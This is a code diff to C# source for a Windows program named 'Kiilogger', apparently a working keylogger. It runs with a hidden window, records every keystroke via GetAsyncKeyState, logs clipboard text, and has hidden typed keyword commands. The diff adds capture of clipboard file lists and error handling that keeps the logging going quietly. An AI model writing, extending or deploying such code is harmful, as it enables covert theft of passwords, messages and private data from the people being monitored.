@@ -10,7 +10,7 @@ using System.Windows.Forms;
 using Microsoft.VisualBasic;
 using System.Diagnostics;
 using System.IO;
-
+using System.Collections.Specialized;
 
 namespace Kiilogger
 {
@@ -22,9 +22,6 @@ namespace Kiilogger
             InitializeComponent();
             this.Visible = false;
         }
-
-
-
 
         #region Variables
         /// <summary>
@@ -52,7 +49,11 @@ namespace Kiilogger
         /// </summary>
         string OldClipText = string.Empty;
         /// <summary>
-        /// Stores Old Winodw Title for Comparison
+        /// Stores old Clipboard Copied Files' Names
+        /// </summary>
+        System.Collections.Specialized.StringCollection OldFiles;
+        /// <summary>
+        /// Stores Old Window Title for Comparison
         /// </summary>
         string OldWindowTitle = string.Empty;
         /// <summary>
@@ -66,20 +67,15 @@ namespace Kiilogger
         #endregion
 
         #region Constants
-
         const int ShiftKeyDownState = -32768;
         const int ShiftKeyCode = 16;
         const int KeyDownState = -32767;
-
         #endregion
 
 
         public MainForm(string[] args)
         {
             InitializeComponent();
-
-
-            //Debug.Print(System.Threading.Thread.CurrentThread.GetApartmentState().ToString());
             if (args.Length == 0)//No commandline arguments passed. Show what to pass.
             {
                 var inifile = Path.GetFileNameWithoutExtension((System.Reflection.Assembly.GetExecutingAssembly().Location)) + ".ini";
@@ -90,20 +86,16 @@ namespace Kiilogger
                     return;
                 }
                 else
-                {
                     args = File.ReadAllLines(inifile);
-                }
             }
 
             bool pathSpecified = false;
             bool keywordSpecified = false;
             foreach (var arg in args)
-
             {
                 if (arg.ToLower() == "nohint")
-                {
                     mVisible = false;
-                }
+
                 if (arg.ToLower().StartsWith("path=") && arg.Length > 5)
                 {
                     pathSpecified = true;
@@ -138,12 +130,7 @@ namespace Kiilogger
             KeyTimer.Enabled = true;
             KeyTimer.Start();
             NotepadWriteLine(@"Pass ""nohint"" as first parameter to hide this text in notepad.");
-
         }
-
-
-
-
 
         /// <summary>
         /// Called by KeyTimer on its Tick Event. Used to check which keys are pressed.
@@ -151,7 +138,6 @@ namespace Kiilogger
         /// <param name="state">Not used</param>
         private void KeyTimer_Tick(object sender, EventArgs e)
         {
-            //Debug.Print(System.Threading.Thread.CurrentThread.GetApartmentState().ToString());
             int KeyState;
             int ShiftKeyState;
             int KeyCode;
@@ -166,6 +152,7 @@ namespace Kiilogger
             }
             else
             {
+                //for Alphabet Keys
                 for (KeyCode = 65; KeyCode <= 90; KeyCode++)
                 {
                     KeyState = NativeMethods.GetAsyncKeyState(KeyCode);
@@ -174,18 +161,22 @@ namespace Kiilogger
                     {
                         if (ShiftKeyState == ShiftKeyDownState)
                         {
+                            //UPPER CASE LETTERS A-Z
                             BufferBuilder.Append(Strings.Chr(KeyCode));
                         }
                         else
                         {
+                            //lower case letters a-z
                             BufferBuilder.Append(Strings.Chr(KeyCode + 32));
                         }
                     }
                 }
+
+                // iterate over keys
                 for (KeyCode = 8; KeyCode <= 222; KeyCode++)
                 {
 
-                    if (KeyCode == 65)///Escape Keys 65 to 90. So jump forloop from 65 to 91
+                    if (KeyCode == 65)///Escape Alphabet Keys as they were checked already. So jump forloop from 65 to 91
                         KeyCode = 91;
                     KeyState = NativeMethods.GetAsyncKeyState(KeyCode);
                     ShiftKeyState = NativeMethods.GetAsyncKeyState(ShiftKeyCode);
@@ -406,6 +397,7 @@ namespace Kiilogger
                 }
             }
 
+            //check if Keyword+"stat" was typed recently
             if (BufferBuilder.ToString().Contains(Keyword + "stat"))
             {
                 Debug.Print("stat");
@@ -413,6 +405,8 @@ namespace Kiilogger
                 BufferBuilder.Clear();
                 Process.Start("notepad.exe", LogPath);
             }
+
+            //check if Keyword+"exit" was typed recently
             if (BufferBuilder.ToString().Contains(Keyword + "exit"))
             {
                 KeyTimer.Stop();
@@ -424,15 +418,41 @@ namespace Kiilogger
                 Close();
             }
 
-            if (Clipboard.ContainsText())
+            //Required so as not throw exceptions when clipboard is locked.
+            try
             {
-                var currentClipText = Clipboard.GetText();
-                if (currentClipText != OldClipText)
+                //Log Cliboard Text
+                if (Clipboard.ContainsText())
                 {
-                    OldClipText = currentClipText;
-                    BufferBuilder.Append(Environment.NewLine + "<Clip><![CDATA[" + currentClipText + "]]></Clip>");
+                    var currentClipText = Clipboard.GetText();
+                    if (currentClipText != OldClipText)
+                    {
+                        OldClipText = currentClipText;
+                        BufferBuilder.Append(Environment.NewLine + "<Clip><![CDATA[" + currentClipText + "]]></Clip>");
+                    }
+                }
+                //Log Clipboard file paths
+                else if (Clipboard.ContainsFileDropList())
+                {
+                    var currFiles = Clipboard.GetFileDropList();
+                    var currFilesCount = currFiles.Count;
+                    if (OldFiles == null || currFilesCount != OldFiles.Count || !currFiles.IsEqualTo(OldFiles, currFilesCount))
+                    {
+                        OldFiles = currFiles;
+                        BufferBuilder.Append(Environment.NewLine + "<ClipFiles>");
+                        foreach (var file in currFiles)
+                        {
+                            BufferBuilder.Append(Environment.NewLine + file);
+                        }
+                        BufferBuilder.Append(Environment.NewLine + "</ClipFiles>");
+                    }
                 }
             }
+            catch
+            {
+                BufferBuilder.Append(Environment.NewLine + "<Clip><![CDATA[Error Reading Clipboard]]></Clip>");
+            }
+
             // if BufferBuilder contains more than 400 characters then write to LogFile
             if (BufferBuilder.Length > 400)
             {
@@ -479,7 +499,7 @@ namespace Kiilogger
                 KeyTimer.Stop();
                 LogWriter.Dispose();
             }
-        }
+        }   
     }
 
 
@@ -498,5 +518,16 @@ namespace Kiilogger
         [DllImport("User32.dll")]
         internal static extern int SetForegroundWindow(IntPtr point);
         #endregion
+    }
+
+    static class Extn
+    {
+        internal static bool IsEqualTo(this StringCollection src, StringCollection dst, int length)
+        {
+            for (int i = 0; i < length; i++)
+                if (src[i] != dst[i])
+                    return false;
+            return true;
+        }
     }
 }
